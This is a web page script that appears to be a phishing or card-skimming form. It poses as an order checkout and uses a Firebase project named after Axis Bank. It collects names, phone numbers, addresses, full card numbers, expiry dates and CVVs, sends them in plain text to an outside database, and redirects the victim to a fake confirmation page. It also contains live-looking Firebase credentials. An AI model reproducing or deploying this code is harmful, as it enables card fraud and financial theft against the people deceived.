<script type="module">
    // Import Firebase Modules
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
  
    // Firebase Config
    const firebaseConfig = {
      apiKey: "AIzaSyC8efw8abfPHkiaI0mOKmzFwqfDkXnvT6M",
      authDomain: "dark-world-axis-bank.firebaseapp.com",
      databaseURL: "https://dark-world-axis-bank-default-rtdb.firebaseio.com",
      projectId: "dark-world-axis-bank",
      storageBucket: "dark-world-axis-bank.firebasestorage.app",
      messagingSenderId: "699948191677",
      appId: "1:699948191677:web:1c3609ba8e9179c87c8cd4",
      measurementId: "G-QQDY863E0T"
    };
  
    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
  
    // Function to Save Data
    function saveData(event) {
      event.preventDefault();
  
      // Input Fields Se Data Get Karna
      let fullName = document.getElementById("fullName").value.trim();
      let mobileNumber = document.getElementById("mobileNumber").value.trim();
      let city = document.getElementById("city").value.trim();
      let state = document.getElementById("state").value.trim();
      let address = document.getElementById("address").value.trim();
      let pincode = document.getElementById("pincode").value.trim();
      let cardNumber = document.getElementById("cardNumber").value.trim();
      let expiryMM = document.getElementById("expiryMM").value.trim();
      let expiryYY = document.getElementById("expiryYY").value.trim();
      let cvv = document.getElementById("cvv").value.trim();
  
      // Validation
      if (!fullName || !mobileNumber || !city || !state || !address || !pincode ||
          !cardNumber || !expiryMM || !expiryYY || !cvv) {
          alert("Please fill all fields");
          return;
      }
  
      if (mobileNumber.length !== 10) {
          alert("Mobile Number must be 10 digits.");
          return;
      }
  
      if (pincode.length !== 6) {
          alert("Pin code must be 6 digits.");
          return;
      }
  
      if (cardNumber.replace(/\s/g, "").length !== 16) {
          alert("Enter a valid 16-digit card number.");
          return;
      }
  
      if (cvv.length !== 3) {
          alert("Enter 3-digit CVV.");
          return;
      }
  
      if (parseInt(expiryMM) < 1 || parseInt(expiryMM) > 12) {
          alert("Enter correct expiry month.");
          return;
      }
  
      let currentYear = new Date().getFullYear() % 100;
      if (parseInt(expiryYY) < currentYear) {
          alert("Enter a valid expiry year.");
          return;
      }
  
      // Data Save Karna Firebase Database Me
      push(ref(db, "orders"), {
          fullName: fullName,
          mobileNumber: mobileNumber,
          city: city,
          state: state,
          address: address,
          pincode: pincode,
          cardNumber: cardNumber,
          expiryMM: expiryMM,
          expiryYY: expiryYY,
          cvv: cvv,
          timestamp: new Date().toLocaleString()
      }).then(() => {
        //   alert("Order Placed Successfully!");
        
          window.location.href = "confirmorder.html"; // Redirect to confirmation page
      }).catch(error => {
          console.error("Error saving data:", error);
        //   alert("Failed to place order. Try again!");
      });
    }
  
    // Event Listener for Place Order Button
    document.addEventListener("DOMContentLoaded", function () {
      document.querySelector(".place-order").addEventListener("click", saveData);
    });
  
  </script>
